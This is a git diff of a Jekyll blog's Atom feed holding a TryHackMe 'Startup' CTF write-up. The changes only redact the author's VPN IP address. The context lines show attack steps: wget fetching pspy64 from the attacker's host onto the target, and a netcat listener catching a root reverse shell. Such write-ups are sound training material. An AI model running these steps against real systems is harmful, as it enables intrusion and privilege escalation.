@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2020-11-21T13:00:33+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Startup Write Up</title><link href="https://darrynbrownfield.co.uk/startup" rel="alternate" type="text/html" title="Startup Write Up" /><published>2020-11-21T00:00:00+00:00</published><updated>2020-11-21T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/startup</id><content type="html" xml:base="https://darrynbrownfield.co.uk/startup">&lt;p&gt;&lt;img src=&quot;/assets/images/startup/cover.jpg&quot; alt=&quot;Startup&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="https://darrynbrownfield.co.uk/feed.xml" rel="self" type="application/atom+xml" /><link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" /><updated>2020-11-21T13:13:38+00:00</updated><id>https://darrynbrownfield.co.uk/</id><title type="html">Darryn Brownfield</title><subtitle>Infosec | Hacking | CTF</subtitle><entry><title type="html">Startup Write Up</title><link href="https://darrynbrownfield.co.uk/startup" rel="alternate" type="text/html" title="Startup Write Up" /><published>2020-11-21T00:00:00+00:00</published><updated>2020-11-21T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/startup</id><content type="html" xml:base="https://darrynbrownfield.co.uk/startup">&lt;p&gt;&lt;img src=&quot;/assets/images/startup/cover.jpg&quot; alt=&quot;Startup&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
 
@@ -452,7 +452,7 @@ Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
 30 updates are security updates.
 
 
-Last login: Sat Nov 21 12:01:37 2020 from 10.8.21.217
+Last login: Sat Nov 21 12:01:37 2020 from (VPN IP)
 $ bash
 lennie@startup:~$ ls -alh
 total 24K
@@ -526,7 +526,7 @@ lennie@startup:~/scripts$
 &lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;lennie@startup:~/scripts$ cd /dev/shm
 lennie@startup:/dev/shm$ wget http://(VPN IP)/pspy64
 --2020-11-21 12:13:38--  http://(VPN IP)/pspy64
-Connecting to 10.8.21.217:80... connected.
+Connecting to (VPN IP):80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 3078592 (2.9M) [application/octet-stream]
 Saving to: ‘pspy64’
@@ -557,7 +557,7 @@ lennie@startup:~/scripts$
 &lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Startup]
 └──╼ $nc -nvlp 8888
 listening on [any] 8888 ...
-connect to [10.8.21.217] from (UNKNOWN) [10.10.27.29] 34830
+connect to [(VPN IP)] from (UNKNOWN) [10.10.27.29] 34830
 bash: cannot set terminal process group (2212): Inappropriate ioctl for device
 bash: no job control in this shell
 root@startup:~# cd /root
